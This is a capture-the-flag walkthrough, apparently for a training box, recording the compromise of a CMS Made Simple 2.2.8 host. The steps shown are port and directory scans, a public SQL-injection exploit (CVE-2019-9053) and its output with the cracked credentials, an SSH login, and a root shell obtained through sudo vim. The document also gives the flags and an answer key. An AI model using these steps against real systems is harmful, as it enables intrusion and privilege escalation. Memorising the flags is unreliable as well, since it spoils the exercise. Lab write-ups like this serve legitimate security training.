# CMS Made Simple (2.2.8) CTF Walkthrough

## Initial Enumeration
- Ran a full nmap scan against target `10.201.13.81`:
  ```
  nmap -sV -p- 10.201.13.81
  ```
  Results:
  - 21/tcp open ftp vsftpd 3.0.3
  - 80/tcp open http Apache 2.4.18
  - 2222/tcp open ssh OpenSSH 7.2p2

- Answers:
  - Services under port 1000: 2
  - Higher port service: SSH

## Web Enumeration
- Used gobuster to find directories:
  ```
  gobuster dir -u http://10.201.13.81/ -w /usr/share/wordlists/dirb/common.txt
  ```
  Found `/simple/` → CMS Made Simple.

- CMS Made Simple 2.2.8 is vulnerable to SQL Injection.
- CVE used: CVE-2019-9053
- Vulnerability type: SQLi

## Exploitation
- Tried to run exploit:
  ```
  python3 46635.py -u http://10.201.13.81/simple/ -w /usr/share/wordlists/rockyou.txt
  ```
  Error: `SyntaxError: Missing parentheses in call to 'print'`  
  Cause: Script is written for Python2.  
  Fix: Installed python2 and ran:
  ```
  python2 46635.py -u http://10.201.13.81/simple/ -w /usr/share/wordlists/rockyou.txt
  ```

- Successful output:
  ```
  [+] Salt: 1dac0d92e9fa6bb2
  [+] Username: mitch
  [+] Email: admin@admin.com
  [+] Password hash: 0c01f4468bd75d7a84c7eb73846e8d96
  [+] Cracked password: secret
  ```

- Answer:
  - Password: secret

## Shell Access
- Logged into SSH on higher port:
  ```
  ssh -p 2222 mitch@10.201.13.81
  ```
  Password: `secret`

- Answer:
  - Login service: SSH

## User Flag
- Retrieved user flag:
  ```
  cat /home/mitch/user.txt
  ```
  Flag: `G00d j0b, keep up!`

- Checked home directory:
  ```
  ls /home
  ```
  Found another user: `sunbath`

- Answers:
  - User flag: G00d j0b, keep up!
  - Other user: sunbath

## Privilege Escalation
- Checked sudo permissions:
  ```
  sudo -l
  ```
  Output: `mitch` can run `/usr/bin/vim` as root without password.

- Spawned root shell:
  ```
  sudo vim -c ':!/bin/sh'
  ```

## Root Flag
- Retrieved root flag:
  ```
  cat /root/root.txt
  ```
  Flag: `W3ll d0n3. You made it!`

- Answer:
  - Root flag: W3ll d0n3. You made it!

## Errors Faced & Fixes
1. **Nmap syntax error**
   - Mistyped `-p1-1000-65535`
   - Fix: Use `-p-` for all ports or `-p1-1000` for specific range.

2. **Exploit script Python3 error**
   - Script used Python2 print syntax.
   - Fix: Installed python2 and ran the exploit with it.

3. **apt-get IPv6 errors**
   - Package installation failed due to IPv6 connectivity issues.
   - Fix: Forced apt to use IPv4 with `-o Acquire::ForceIPv4=true`.

## Final Answers
- Higher port service: SSH
- CVE: CVE-2019-9053
- Vulnerability type: SQLi
- Password: secret
- Login service: SSH
- User flag: G00d j0b, keep up!
- Other user: sunbath
- Privilege escalation via: vim
- Root flag: W3ll d0n3. You made it!
